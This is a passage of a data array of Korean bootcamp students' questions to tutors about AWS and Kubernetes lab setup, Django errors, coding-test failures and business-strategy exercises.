\\n\\n답변 감사합니다.',\n","       '[추가 질의]\\n1. 하나의 산업분야로 정해보았는데, 어려워서 산업분야를 다시 한 번 고민해보겠습니다...\\n\\n2. 어제 답변에서 Problem에 대한 정의를 Gap으로 적어주셨는데, 비교해서 볼 수 있게 As-Is는 무엇이라고 정의하시는 지도 궁금합니다.',\n","       '쉬는시간 전에 태그로 본인 아이디를 검색해서 해당 인스턴스를 찾으라 하셨는데\\n\\n현재 5반(도쿄) 쪽에 이름 및 태그가 아무도 조회가 안되는 상황입니다\\n이런 경우에는 어찌해야할까여...???',\n","       '어제 만든 key값(apk 파일)을 넣고 putty를 실행하는데 open이 안됩니다! \\n어떻게 하면 좋을까요!?\\n\\n------\\n호스트 네임을 안넣어서 그런것 같은데 어제와 동일하게 넣으면 될까요!?',\n","       '서브넷이 누락되었다고 나옵니다',\n","       \"시작 템플릿을 삭제하고 다시 생성하는데\\nThe security group 'a024153-asg-sg' already exists for VPC 'vpc-0f1f30e9b7675938d'\\n문구가 뜨면서 생성이 안됩니다\",\n","       \"어제 마지막까지 하고 삭제를 했는데 The security group 'a025161-asg-sg' already exists for VPC 'vpc-07ac6ebd90eb6cf6b' 에러가 납니다.1번 랩부터 다시 해야 하나요?\",\n","       '컨테이너나 가상 머신에서 image라는 용어를 사용하는데 정확히 어떤 의미인지 모르겠습니다! ㅜㅜ',\n","       '실습3 질문입니다.\\n현재 운송업의 cj대한통운에 대한 전략요소를 정의하고 있습니다.\\n\\n이전 실습에서 해당 업체의 문제와 개선 방안을 소비자의 입장에서 불편한 점보다\\n고객사(대한통운)에 고용된 노동자의 입장에서의 방안이 좀 더 포커스가 맞춰진 것 같은데\\n이런 식으로 진행이 되어도 괜찮을까요?\\n아니면 좀 더 고객사의 고객의 입장에서 볼 수 있는 문제점을 봐야할까요?',\n","       'Where to Compete\\nWhat to Compete\\nHow to Compete\\n에 각각 정확하게 어떤 요소를 적어야할지 개념이 명확하게 잡히지 않은 것 같습니다.\\n',\n","       'where/ how/ what 의 정확한 차이를 구분하지 못하였습니다.\\n이렇게 구분하는 것이 맞을까요?',\n","       '[실습 3] \\n피드백 부탁드립니다. \\n\\n그리고 제가 생각한 의미가 맞는지 확인 부탁드립니다.\\n\\nwhere to는 어디에 집중을 할 것인가? \\n\\nwhat to  무엇에 경쟁우위를 둘 것인가?\\n\\nhow to 어떻게 경쟁사와 비교하여 경쟁우위를 점할 것인가? \\n\\n이렇게 생각하면 될까요? ',\n","       '[실습3]\\n실습 피드백 요청합니다.\\n\\n제가 농구 중계 문제로 고객들의 불편함이 있어 관심도가 떨어진다는걸 하고 있는데\\n중계를 확보하여 관심도를 높여 관중 수익을 내려는 방식으로 하는데 이렇게 하려고 하는데 많이 어렵네요ㅠㅠ',\n","       '전략요소를 작성하다보니 다소 포괄적인 범위로 넓어진 느낌이네요.',\n","       '[실습2]\\n피드백 부탁드립니다.\\n\\n그리고 실습 3에서 Where What How 기본질문 예시 좀 부탁드립니다 ㅠㅠ',\n","       '전략요소에 대한 정보원을 쓰는 과정에서 해당 증권사 펀드에 가입한 투자자 정보(연령층, 기대수익률 등)의 경우 공개되지 않는 경우가 많은데 이러한 경우 어떤 정보원을 활용하면 좋을 지 여쭤보고 싶습니다. 감사합니다.',\n","       '제가 개인 용무로 인해 금요일 오전에 잠시 없을 예정인데, 혹시 주말에 자습을 위해서 aws 서버를 사용하고 싶은데, 혹시 계속 열어두시는지가 궁금합니다.',\n","       ' 안녕하세요, 내일 교육에 참석 못하는데 다음 주에 녹화 영상 보면서 실습을 진행하고자 합니다.\\n다음주에도 AWS 셋팅 환경이 유지되어 실습을 진행해 볼 수 있을까요?',\n","       '아직도 where what how가 너무 헷갈립니다.ㅠ\\n아까\\n- kt는 1년 후에 ~~에 집중해야 한다. where (산업, 시장, 고객과 관련)\\n- 이 시장은 ... 한 걸 원하므로 ~~ 한 걸 해야 한다. what (경쟁 우위를 어떻게 달성할 것인가)\\n- 이걸 하려면 어떻게 어떻게 해야 한다. how (그걸 어떻게 만들어갈 것인가)\\n이렇게 말씀하신 거 정리는 했는데 감이 아직도 안 옵니다...',\n","       '안녕하십니까, 다름이 아니라 제 코드로 4420번을 채점하면 case 7이 Failed가 뜹니다. 어느 상황을 고려해야 하는지 알려주신다면 정말 감사하겠습니다.',\n","       '인스턴스 페이지로 넘어간 후 무슨 작업을 해야 하나요...',\n","       '현재 마스터에 워커 2개다 엮었는데 노드 조회해도 안뜨길래 다시 코드를 그대로 진행시켰는데 어디서 꼬였는지 이제   join값을 뜨지도 않습니다.ㅠㅠㅠ. 그ㅑㄴㅇ 초기화 하고 다시 하고 싶은데 어떻게 해결봐야 할까요',\n","       '자료조사를 통해서 구분하는 것이 모호합닌다',\n","       '[실습4]\\n\\n기업들에 대한 구체적인 정보를 단시간에 확인하기가 제한되어서\\n뉴스 기사들을 참고해서 직관?적으로 작성해봤습니다.\\n\\n감사합니다!',\n","       '디지털화 수준은 어떤 지표를 참고하면 될지 궁금합니다.',\n","       '처음 이런 오류가 발생해서 cloud9 도 다시 만들고\\n터미널 재시작한 후 실행해도 같은 오류가 발생하네요 ㅠㅠ',\n","       '해당실습 어렵게 따라가고 있는데 지금 강사님 자료와 다르게 master node가 설정이 되지않은것 같아 문의드립니다..\\nmaster node 설정이 왜 안되는지 어떤 코드에서 재설정을 해야할지 말씀해주시면 해결해보겠습니다!\\n6반 a024146입니다. ',\n","       '방금 강사님 알려주신대로 ssh -i 로 마스터 노드를 불러왔는데 worker1으로 접속이 되었어요.',\n","       '고객사와 타겟층을 한정하니까 훨씬 수월해진 느낌입니다.\\n공공기관의 비용가치를 측정할 때, 저는 주로 사전/사후 비교를 하거나 아니면 이전에 도입하지 않아서 발생했던 문제들을 해결하는데 소요된  시간경제적 비용을 주로 제시했습니다. 이외에도 추가적으로 생각해볼만한 것들이 있을까요? ',\n","       '[실습5]\\n피드백 요청 드립니다.\\n\\n서비스의 경우 눈에 보이지 않는데 기능/사용 가치를 어떻게 적용해야 하는지 감이 오지 않습니다.',\n","       '정서가치를 작성하는 부분에 어려움이 있어 질문 드립니다.\\n\\n정서가치는 어떻게 생각해서 내용을 작성하면 좋을까요??',\n","       '안녕하세요!\\n과제 수행 중 헷갈리는 부분으로 수정함에 따라 과제 제출을 아직 못하게 되었습니다.\\n혹시 은 어떤 방식으로 서치하고 작성하면 좋을 지 문의 드려도 될까요?\\n\\n부디 좋은 하루 보내시길 바라겠습니다!',\n","       '수업 중 별다른 피드백 없이 진행되어 제 스스로 잘하고 못한 부분 평가가 어려워 문의 드립니다.\\n아래 문구는 임의로 작성하였는데, 더 구체적으로 작성하고 싶으나 아직 감을 못잡아 쉽지 않은 것 같습니다.\\n\\n잘못된 부분이 있다면 짚어주세요.\\n주말 잘 보내세요!!! 항상 감사드립니다!!',\n","       '즉 nodeport는 각각의 pod의 IP값이 할당 될 때마다 달라지니 처음에 만들어질때부터 service를 연결시켜서 외부와의 통신이 service로 이루어 지게 하고 로드 밸런싱 기법으로 분배를 하는 것이고 특정 pod에 접속 하는 경우에는 pod IP:port num 식으로 추가적인 입력으로 하면 접근 할 수 있게 된다.\\n특정 Pod로 접속하는것은 매우 예외적인 예시이다 이렇게 이해하면 될까요?',\n","       \"이유는 모르겠지만 아직 해결되지 않은 문제임에도 실수로 제출을 눌렀더니 제출결과로 '맞았습니다.'가 표시 되었습니다.\\n실행속도는 0ms로 표시 됩니다.\",\n","       '시스템의 원활한 운영도 운영변수일까요??\\n', '강의 저장이 되나요?',\n","       '아까 말씀하신 데이터 타입 6개 중 하나인 function과 pdf파일에  나타나있는 참조타입 Object에 있는 Function과는 다른 건가요?  ',\n","       '처음 실행 시에는 잘 나오다가 실수로 창을 꺼서 다시 Run 시켰는데 캡쳐한 사진처럼 접속이 막힙니다.\\n무슨 이유일까요?',\n","       'extension 에서 open in browser  확장프로그램을 다운 받았는데 그 다음에 어떻게 하는지 모르겠어요 제가  아침에 핸드폰이 고장나서 지금 처음 들어와서요.. ㅠ 혹시 원격 지원 부탁드려도 될까요',\n","       '\\n        document.write(\"hello\")\\n\\n\\n이런 코드라면, myScript.js안의 내용이 출력되고, 스크립트 안 직접 써준 hello라는 글자도 같이 출력이 되야할것 같은데 그냥 myScript.js의 내용만 출력되는 이유는 무엇인지 궁금합니다.',\n","       '여기어때의 청각 서비스는 어떤 것을 해야하는지 고민을 하다 시각장애인 분들도 이용할 수 있도록 음성 서비스로 방의 컨셉이나 분위기를 알려주는 서비스를 생각해보았는데 이렇게 하는게 맞을까요?\\n\\n그리고 RTB는 어떻게 작성해야하는지 모르겠습니다 ㅠㅠ',\n","       '보조강사님들, 항상 고생 많으십니다.\\n실습7 피드백 부탁드립니다.\\n\\n추가 질문: 실습 7 고객가치 정의 대상을 B2B인 저희 입장에선 고객사에서 그치는 것인지, 고객사의 고객까지 포함하는건지 애매하다고 느겨져서 2가지 준비했는데 어느 대상이 맞는지 궁금합니다. \\n그리고 속성과 혜택을 적으면서 비슷한 부분이 많다고 느껴졌는데,  혜택은 제공하는 기능, 속성은 기능을 제공하는 플랫폼 혹은 서비스 형태로 이해하면 될까요? 마지막으로 RTB가 뭔지 설명 부탁드립니다..',\n","       '실습 7입니다.\\n감사합니다.\\n\\n추가적으로 RTB의 경우 기존에 다른 곳에서 사용했을 경우 고객의 고객들의 만족도를 정량적 수치로 평가한 거 같은데..\\nRTB는 어떻게 작성해야할지 모르겠습니다.',\n","       '[실습7] 피드백부탁드립니다.\\n운동감각에서 플리킹 부분이 운동감각인지 시각인지 헷갈립니다.',\n","       '[실습7]피드백 요청합니다\\nrtb에 대한 정확한 의미를 이해하지 못 했습니다.\\n신기술에 대한 아이디어를 제안했는데 타사에 적용했을시에 대한 설정을 하는걸까요?\\n',\n","       '입력 예시에서는 다 통과하는데 뭐가 문제일까요...?\\n그리고 \\n단, 조건을 만족하는 아파트 단지가 여러개일 경우, 더 작은 번호의 아파트 단지에 분리수거장을 짓습니다.\\n\\n이건 어떻게 코드로 구현 가능할까요..?\\n',\n","       '맨 마지막 부분에서\\n일단 가치가 큰 것부터 작은 것에 넣어야 하는 건 이해가 가는데 코드로 어떻게 표현할까요...??\\n만약에 가치가 큰 것의 무게가 가방보다 더 크면 다음 가방으로 넘어가는 식으로 표현하고 싶습니다...!',\n","       '세일즈 툴킷을 어떤 방식으로 적용할지',\n","       '경쟁우위 속성/혜택 근거의 경우 지금처럼 구체적인 매체를 언급하는 것인가요?',\n","       '[실습8]\\n\\n실습7을 기반으로 작성해서 실습7이 잘못되었다면 실습8도 잘못되었을 것 같긴합니다만..\\n\\n우선 세일즈툴킷을 어떤식으로 작성해야하는지 감이 잘 안와서 비워뒀습니다. 앞에 쓴 내용이랑 겹치는 것 밖에 떠오르지가 않아서요.. 해당 내용과 전체적으로 잘못된 부분 없는지 피드백 부탁드리고 가격과 Statement는 자세한 수치를 특정하기가 힘들어서 어떤식으로 작성하는지만 파악했습니다. 감사합니다.',\n","       '[실습8]\\n문제를 탐색형으로 정하였습니다.\\n개선점 탐색 방향 쪽으로 잡으면 빅데이터 분석또한 솔루션으로 들어갈 수 있을까요?? ',\n","       '제가 설명을 잠시 놓쳤는데 예제 03-16에서 왜 실행결과가 GLOBAL이 아니고 undefined인지 알고싶습니다.\\n',\n","       '답변 감사합니다! \\n말씀해주신 QR코드에 대해 생각해 본 결과, \\n결과적으로 제가 다이소에 제공하고 싶은 것은, 매장마다 상이한 수많은 물품들을 찾을 수 있는 \"물품 탐색\" 서비스라는 생각이 들었습니다! 그래서 특정 상품마다 QR코드를 도입하는 것보다 매장별로 키오스크 층마다 1대씩 부여하는 것이 좋지 않을까라는 생각이 듭니다! \\n생각할 부분에 대해 짚어주셔서 감사합니다. ',\n","       '[실습9]\\n실습 피드백 요청드립니다.\\n제공하고자 하는 것이 메뉴 추천 서비스라 생산/개발 부분에 어떤 내용이 들어가야 하는지 고민이 됩니다.\\n또한 전체적으로 내용이 맞게 들어갔는지도 알고 싶습니다.\\n감사합니다:)\\n',\n","       '[실습10] 피드백 요청드립니다! :D\\n공급자 / 사업파트너 / 정부(지자체)의 작성이 어려운 것 같습니다...!\\n관련해서 참고할만한 내용이나 방향이 있을까요?\\n\\n피드백 감사합니다. 오늘 하루도 고생하셨습니다 !! ',\n","       '핵심파트너 선정이 어려운 것 같습니다.. 저가 생각한 알고리즘 기술은 전문가(?)가 따로 필요한가에 대해 생각해보았을 때,  필요한지는 잘모르겠습니다..',\n","       '[실습11]\\n\\n안녕하세요!\\n\\n실습11 파일 업로드 합니다.\\n\\n고객세그먼트부분에는 고객사입장에서 어떤 고객을 타겟으로 하는지를 적는게 맞을까요 ? 아니면 고객사가 타겟으로 하는 부분을 적는게 맞을까요 ?\\n\\n피피티 파일에는 고객세그먼트부분에 디지털화 강화를 통한 경쟁력 확보를 고려하고 있는 은행 및 금융권이라 적혀있어서 고객사의 입장, 목표 등을 적는것인지 헷갈려서 문의드립니다.\\n\\n피드백 감사드립니다 !\\n\\n감사합니다. ',\n","       '빅프로젝트 기간동안 지난 강의들 모두 볼 수 있으면 좋겠는데 여기에 건의사항을 올리면 될까요??\\n\\n빅프로젝트 하는데 또 다시 공부하는데 많은 도움이 될거 같아 요청드립니다! \\n\\n저말고 다른 에이블러분들도 많은 도움이 될거라고 생각합니다 부탁드립니다!\\n\\n에이블 교육 총괄 하시는 분께 요청 부탁드린다고 전달 해주세요!\\n\\n묵살하지마시고 꼭 전달 부탁드려요!!',\n","       'DB 워크 벤치 접속이 안되고 있습니다.',\n","       '어제 설정한 비밀번호로 접속하려 하니 저 에러가 떠서 비밀번호를 다시 설정하려고 하는데 https://dhan-description.tistory.com/84 이 방법에서는 my.ini 파일이 존재하지 않아 하지 못했고 https://www.upchris.com/archives/607 이 방법에서는 캡쳐한 바와 같이 접근이 안되어서 할 수 없습니다 어떻게하면 비밀번호 초기화를 하나요',\n","       '안녕하세요!\\n\\n제가 공지를 듣기 전에 조별과제제출란에 지금 실습하고 있는 자기제안서를 제출했는데,\\n파일을 지우려고하니 삭제가 안돼서 어떻게 하면 될까요 ?\\n\\n감사합니다.',\n","       '다음과 같이 입력 받은 리스트를 계산하기 편한 순서로 정렬한 뒤\\n최소 공배수와 최대 공약수를 이용해 계산하는 코드를 구성 했습니다.\\n그런데 case 2, 3, 5에서 실패하는데 어느 부분에 오류가 있는지 궁금합니다.',\n","       '에듀 점검 전인데도 제출하기 페이지로 넘어가기 않았습니다\\n\\n현재 미제출로 표시돼있고 해당 내용은 매니저에게 먼저 전달하고 문의드립니다\\n',\n","       'django 3.2 설치했고 버전체크, pip list에도 설치된거로나오는데 migrate가 되지 않습니다',\n","       '조별실습 참여\\n팀원이 링크 보내줘서 지금 잘 들어와있긴한데 \\n홈페이지에 있는 조별실습 참여하기 누르면 줌 로그인 버튼만 활성화되고, 참여하기 버튼은 활성화가 안됩니다.',\n","       \"INSTALLED_APPS = [\\n    'django.contrib.admin',\\n    'django.contrib.auth',\\n    'django.contrib.contenttypes',\\n    'django.contrib.sessions',\\n    'django.contrib.messages',\\n    'django.contrib.staticfiles',\\n    'blog.apps.BlogConfig'\\n]\\n후에 -m도 사용해 보고 오류가 고쳐지질 않습니다.\\n문의전에 이미 다 해보았습니다..ㅠ\",\n","       'sqlite3 가 아닌 mysql 사용하려던게 잘못된거 같습니다.',\n","       'https://sqlitebrowser.org/dl/\\n여기에서 DB Browser for SQLite - Standard installer for 64-bit Windows\\n이걸로 받고 인스톨 까지 완료했는데\\ndb.sqlite3 파일을 열면 자꾸\\n연결할 앱이 없다고 나옵니다 ㅜㅜ\\n어떻게 해야 하나요?',\n","       \"원격지원 받고 \\noduleNotFoundError: No module named 'blog.urls'\\n문제 해결 되었는데 \\n맥환경과 윈도우 환경이 달라서 나오는 차이라고 말씀하셨는데 앱추가와 관련된 부분인가요?\",\n","       'numpy를 사용해서 코드를 작성했는데 오류가 떠서요.\\n오류가 뜰 코드가 아니라고 생각되어서 혹시 numpy를 사용할 수 없는지 궁금합니다.',\n","       'def detail(request, id):\\n    \\n    post = get_object_or_404(Post, id=id)\\n    \\n    return HttpResponse(post.title)\\n\\n와 같이 작성했는데 통상과 같은 에러 메세지만 나옵니다.\\n\\n\\n\\n\\nUsing the URLconf defined in mysite.urls, Django tried these URL patterns, in this order:\\n\\nadmin/\\nblog/ test1/\\nblog/ test3////\\nblog/ test2//\\nblog/\\nblog/ /\\nThe current path, blog/5/, matched the last one.\\n\\n이렇게요',\n","       \"안녕하세요 튜텨님 현재 7번 실습 진행중인데 커맨드 창에 ModuleNotFoundError: No module named 'myappdjango' 이렇게 에러가 뜨는데 어떻게 해결하면 좋을까요??\",\n","       '코드를 이렇게 짰는데요, \\n3개를 사야한다고 칠 때\\n5개 3원씩 파는 가게에서 사야 하면 15원이 들지만,\\n2개 5원, 1개 4원 이렇게 사면 14원이어서 더 싸게 살 수 있는 경우가 있어서 그 경우를 고려를 안 하고 짜서 fail이 뜨는 것 같습니다...!\\n그런 경우를 고려하면서 코드를 짜려면 어떻게 짜야할까요..?',\n","       '강사님께서 방금 개별과제는 없고 조별활동만 있다고 하셨는데\\n에이블 홈페이지에는 개별과제제출만 존재합니다. 혹시 조별과제와 개별과제제출이 같이 있는걸까요?',\n","       '안녕하세요!  조별과제 제출에 대해서 질문이 있습니다.\\n과제탭에 \\n제안서 작성_조별실습\\n제안서 작성_3일차 조별과제 제출 탭이 있는데 \\n어느 탭으로 제출해야 하나요?',\n","       '안녕하세요!\\nadmin창은 뜨는데 comment 를 누르면 오류가 떠요 ㅠㅠ 혹시 원격지원 부탁드려도 될까요',\n","       'localhost:8000/admin 주소창에 쳐서 들어가면 무한로딩 되면서 들어가지질 않습니다.\\n전 시간만 해도 잘 됐는데 이번시간에 갑자기 무한로딩 걸립니다 무엇이 제일까요?\\nmodel모듈에서 migrations, migrate는 다 했습니다.\\nrunserver도 다시 해봤습니다',\n","       'make, migrate 둘다 진행해 봤고 둘다 변경사항 없다고 나오네요\\n',\n","       '지난 목요일인  11월 10일 강의부터 복습영상이 올라오지 않는 것 같은데, 제안서 작성 강의는 복습영상이 없나요?',\n","       \"아까 내부클래스 Meta 선언하고 ordering = ['-id']해줬는데 오류가 납니다.\\nshell에서도 오류가 나는데 파일 첨부가 안됩니다.\",\n","       'list.html의 method를 post로 해도 get으로 해도 웹페이지의 변화가 없습니다.',\n","       '안녕하세요 튜터님. 다음과 같이 그래프를 만들고 DFS를 돌렸는데 예제 외에는 답이 안 나옵니다.\\n어느 부분이 잘못 된 것인지 알고 싶습니다. 전체 코드는 첨부파일로 올리겠습니다.',\n","       'import sys\\nsys.setrecursionlimit(100000)\\nn,m = map(int,input().split())\\ngraph = []\\nfor _ in range(n):\\n    graph.append(list(map(int,input().split())))\\n\\ncnt = 0\\ndef dfs(x,y,value):\\n    global cnt\\n    if x==m-1 and y==n-1:\\n        cnt+=1\\n        \\n    dx = [-1,0,1,0]\\n    dy = [0,1,0,-1]\\n    flag = 0\\n    for i in range(4):\\n        nx = x+dx[i]\\n        ny = y+dy[i]\\n        if 0\u0026lt;=nx\u0026lt;m and 0\u0026gt;\u0026lt;=ny\u0026lt;n: if graph[ny][nx]\u0026gt;\u0026lt;value: dfs(nx,ny,graph[ny][nx]) else: flag==4: +=1 if return False True dfs(0,0,graph[0][0])== False: print(0) print(cnt%998244353) 이렇게 dfs를 통해 완전탐색하는 형식으로 짰는데, 어떤걸 놓쳤는지 잘 모르겠습니다..\u0026gt;',\n","       '안녕하세요!\\n\\n채점하기를 누르면 사진과 같이 안내메시지가 나옵니다.\\n어제 밤부터 이러한 현상이 발생합니다. 어떻게 해결해야하나요?',\n","       'aivle2022 로 접속이안됩니다',\n","       '강의장이 갑자기 팅겨서.. 해당 부분을 제대로 학습하지 못했습니다.\\n해당 주석처리된 부분을 저는 커맨드로 입력하여 20을 출력했는데\\n강의 내에서는 주석을 풀고 실행시켜보라고 하셨다고 했다고 합니다.\\n\\n해당 model.py 코드에 해당 count 코드 실행시키려면 어떻게 해야하나요??',\n","       '에러가 뜨는게 아니라 해당 파일 count관련 코드 주석을 풀어서 출력하는 방법이 궁금한겁니다!!\\n\\n저는 그냥  shell열어서 해당 코드를 직접 입력해서 출렸했습니다.\\n\\n해당   model.py에 해당 코드가 있는 이유가 있을 거 같아서요',\n","       '안녕하세요 재차 문의 드린 점 죄송합니다.\\n문제를 푼 날이 하루가 넘게 지났는데 혹시 더 오래 걸리기도 하나요?\\n반영이 금요일 마감날까지 안되지 않을까 해서 문의드립니다.\\n감사합니다',\n","       'blog는 접속이 되는데 book링크로 접속하면 자꾸 에러가 뜨는데 해결방법이 있을까요 ㅠㅠㅠ',\n","       '안녕하세요 4228 문제 반영과 관련되어 문의드립니다.\\n기존에 문의 드린 내용처럼, 문제 자체에는 반영이 되어있으나\\n제가 총 75문제를 풀었는데 74문제를 풀었다고 되어있습니다.\\n혹시 한번 fail했던 문제는 다시 pass하더라도 푼 문제로 증가하지 않나요?\\n감사합니다.',\n","       'gallery로 들어갔는데 404에러가 떴습니다',\n","       'gallery 앱 관련된 주석 제거하고 서버 실행시키니까 사진과 같은 에러가 났습니다\\n검색해서 해결해보려했는데 모르겠어서 문의 드립니다..\\n어떻게 해결할 수 있나요',\n","       'n,m = map(int,input().split())\\ngraph = []\\nfor _ in range(n):\\n    graph.append(list(map(int,input().split())))\\n\\ncnt = 0\\ndef dfs(x,y,value):\\n    global cnt\\n    if x==m-1 and y==n-1:\\n        cnt+=1\\n        \\n    dx = [-1,0,1,0]\\n    dy = [0,1,0,-1]\\n    flag = 0\\n    for i in range(4):\\n        nx = x+dx[i]\\n        ny = y+dy[i]\\n        if 0\u0026lt;=nx\u0026lt;m and 0\u0026gt;\u0026lt;=ny\u0026lt;n: if graph[ny][nx]\u0026gt;\u0026lt;value: dfs(nx,ny,graph[ny][nx]) else: flag==4: +=1 if return False True dfs(0,0,graph[0][0])== False: print(0) print(cnt%998244353) 코딩마스터즈를 풀던 중에, DFS로 문제를 푸로있습니다. 다만 마지막 테케에서 계속해서 TIMEOUT이 뜨고 있습니다. 왜 그런지 알수있을까요? 도저히 모르겠습니다.\u0026gt;',\n","       '내림 차순으로 리스트를 정렬하고 큰 수 부터 새로운 리스트에 양 끝부터 번갈아 가며 채우도록 해서 차이를 최소로 하기 위한 새로운 리스트를 만들었습니다.\\ncase4에서만 실패하는데 어느 부분에 문제가 있을까요?',\n","       \"# template_name='gallery/gallery_form.html'\\n path('add/', CreateView.as_view(model=Image, fields='__all__'), name='image_add'),\\n\\n이미지 마지막 path의 as_view에 template_name을 입력안하면 어떤 규칙으로 html 파일을 찾아가는지 이해가 안되서 질문 드립니다.\\n\\n\",\n","       '플로이드 워셜 알고리즘을 이용해서 답을 구하려 했는데 2,3,5,6 case에서 실패 합니다.\\n어디에 문제가 있을까요?',\n","       '나무베기 문제 bfs로 접근해서 나무가 있는 곳 인덱스를 모두 받은 후 하나씩 나무를 제거한 경우를 계산해서 출력을했는데 case 4번에서 fail이 납니다... 혹시 어떤 부분이 문제인지 알 수 있을 까요?',\n","       '이렇게 작성하면 강사님 화면처럼 출력되지 않고\\n{\"post\": {\"id\": 1, \"title\": \"\\\\uc544\\\\uc774\\\\uc2ac\\\\ub780\\\\ub4dc \\\\uc624\\\\ub85c\\\\ub77c (Iceland Aurora)\", \"description\": \"\", \"image\": \"/media/blog/2022/10/01.jpg\", \"content\": \"\\\\\"\\\\uc624\\\\ub85c\\\\ub77c\\\\\"\\\\uc758 \\\\ub73b\\\\uc740 \\\\ub77c\\\\ud2f4\\\\uc5b4\\\\ub85c \\\\uc0c8\\\\ubcbd\\\\uc774\\\\ub77c\\\\ub294 \\\\ub73b\\\\uc73c\\\\ub85c 1621\\\\ub144 \\\\ud504\\\\ub791\\\\uc2a4 \\\\uacfc\\\\ud559\\\\uc790 \\\\\"\\\\ud53c\\\\uc5d0\\\\ub974\\\\uac00\\\\uc13c\\\\ub514\\\\uac00\\\\\" \\\\ub85c\\\\ub9c8\\\\uc2e0\\\\ud654\\\\uc5d0 \\\\ub4f1\\\\uc7a5\\\\ud558\\\\ub294 \\\\uc5ec\\\\uba85\\\\uc758 \\\\uc2e0 \\\\uc544\\\\uc6b0\\\\ub85c\\\\ub77c\\\\uc758 \\\\uc774\\n\\n이렇게 출력됩니다. 어떻게 강사님처럼 표출되게 할 수 있을까요?',\n","       'fields에 url을 추가해주고 ModelSerializer를 써도 url이 생성되는데 굳이 hyperlinkedModelSerializer를 쓰는 이유가 뭘까요??',\n","       '제목 url에 접속시 \"detail\": \"Method \\\\\"GET\\\\\" not allowed.\"가 떴었는데 어떻게 해결하나요??\\n\\n강사님도 이렇게 뜨셨었는데 잠깐 놓치니 잘나오시네요',\n","       '개별과제랑 최종산출물 해서 총 2개 제출인가요?',\n","       '\"GET /blog/test2/2/ HTTP/1.1\" 200 9\\n\\n이렇게 서버로부터 응답을 받는데 가장 오른쪽에 \\'9\\'가 무엇을 의미하는지 알 수 있을까요?',\n","       '교안과 다르게 만든 인스턴스에서 퍼블릭 IPv4 DNS가 안보이는데 문제 없을까요?',\n","       '혹시 이부분부터 원격지원되나요?\\n',\n","       'Network error: Connection timed out 에러를 어떻게 해결해야할지 모르겠습니다...',\n","       '계속 해봤는데 Network error: Connection timed out이 뜹니다..... 전에 가상화 클라우드 때도 튜터님이 원격을 하셨다가 모르겠다고 포기하셨었는데 뭐가 문제일까요.........',\n","       '지금 웹 개발 단계라고 하셨는데\\ndjango 개발이라고 했었던 지난번 프로젝트 진행에서\\n나온 개인 실습 파일이나 배포된 파일중 myproject3_완성 파일을 웹에 배포하는 것까지가 오늘 실습 과정이라고 이해했는데 지금 뭐를 해야 하는건가요?',\n","       '인스턴스를 처음부터 다시 만들어야 할까요?\\nDNS가 없습니다',\n","       '안녕하세요 putty 부분을 하는 중에 에러가 발생했습니다. \\n이러한 경우 ppk 부분까지는 제대로 된 것 같은데 어떻게 고쳐야할까요?\\n\\n감사합니다.\\n\\nputty에서 ppk를 열면 콘솔창이 아래와같이 뜹니다.',\n","       '제공받은 실습코드에서 runserver 시에 오류가 납니다ㅠㅠ',\n","       \"처음 history 저장을 위해 객체에 담아 DB에 저장할때  models.py 클래스에 \\nclass Result(models.Model):\\n    image = models.ImageField(blank=True)\\n    answer = models.CharField(max_length=10)\\n    result = models.CharField(max_length=10)\\n    pub_date = models.DateTimeField('date published')\\n이 되어있으니 \\n\\n        result.answer = request.GET['answer']# answer를 채워봅시다.\\n        result.image = request.GET['image']# image를 채워봅시다.\\n\\n이렇게 채워야하는것이 아닌가요..?\\n\\n    raise MultiValueDictKeyError(key)\\ndjango.utils.datastructures.MultiValueDictKeyError: 'answer'\\n키 에러가 나서 질문드립니다!\",\n","       'file = # Django 과정에서 배웠던 request.FILES 을 활용하세요\\n\\n이걸 이해 못하겠습니다',\n","       'visual studio code에서 view.py를 작성할 때, 첨부파일과 같이 import 오류가 납니다. 어떻게 해결해야하나요??..',\n","       'resize시 오류가 나는데요 이미지 크기가 0이면 오류가 난다고 하는데 이미지가 안 들어와 있는지 확인하고 싶어서 이미지 경로를 print를 써서 출력해보려 했는데 어디에 뜨는지 모르겠습니다.ㅠㅠ\\n이 방법 말고 해결할 방법이 있을까요??',\n","       '홈페이지 코드를 완성하고 자료를 보면서 배포까지 따라했는데\\nhttp://3.35.9.46/signlanguage/\\n\\n위 링크에 접속이 되면 실습이 완료된건가요?\\n추가로 더 해야할 사항이 있을까요?',\n","       \"파일 업로드시 \\n   img=cv2.resize(img,(28,28))\\ncv2.error: OpenCV(4.6.0) D:\\\\a\\\\opencv-python\\\\opencv-python\\\\opencv\\\\modules\\\\imgproc\\\\src\\\\resize.cpp:4052: error: \\n(-215:Assertion failed) !ssize.empty() in function 'cv::resize'\\n다음과 같은 에러가 납니다 ㅠㅠ\\n그래서 try catch를 사용하니 context변수가 없다고 나옵니다\",\n","       '로컬에서 작업한 것 확인하려고 runserver 하니 다음과 같은 오류가 떠 https://yongku.tistory.com/entry/PYTHON-No-module-named-cv2-%EB%AC%B8%EC%A0%9C-%ED%95%B4%EA%B2%B0%ED%95%98%EA%B8%B0 \\n를 참고하였지만 해결이 되지 않습니다 \\n',\n","       'runserver 부분에서 명령어를 입력하면 모듈을 찾을 수 없다고 오류가 뜹니다.\\n오류부분을 보면 signlanguage 부분이 2번 입력되는데 어떻게 수정을 해야하나요??',\n","       \"background 구동을 위해 nohup sudo /home/ubuntu/anaconda3/bin/python manage.py runserver 0:80 입력하였는데\\nnohup: ignoring input and appending output to 'nohup.out'\\n까지만 나오고 다음 입력창이 안나오고 그 이상 반응이 없습니다.\\n어떻게 해야하나요?\\n\\n\\nsudo fuser -k -n tcp 80를 입력해도 80/tcp: ???? 출력이 나오지 않습니다\\n\\ncat nohup.out 을 입력하면 \\n\\n(base) ubuntu@ip-10-0-1-167:~/deploy/aivle-sign-language--$ cat nohup.out                    Watching for file changes with StatReloader\\nPerforming system checks...\\n\\n2022-11-21 14:57:16.447054: I tensorflow/core/platform/cpu_feature_guard.cc:193] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA\\nTo enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.\\nSystem check identified no issues (0 silenced).\\nNovember 21, 2022 - 14:57:18\\nDjango version 3.2, using settings 'mysite.settings'\\nStarting development server at http://0:80/\\nQuit the server with CONTROL-C.\\nWatching for file changes with StatReloader\\nPerforming system checks...\\n\\n2022-11-21 15:00:47.953770: I tensorflow/core/platform/cpu_feature_guard.cc:193] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 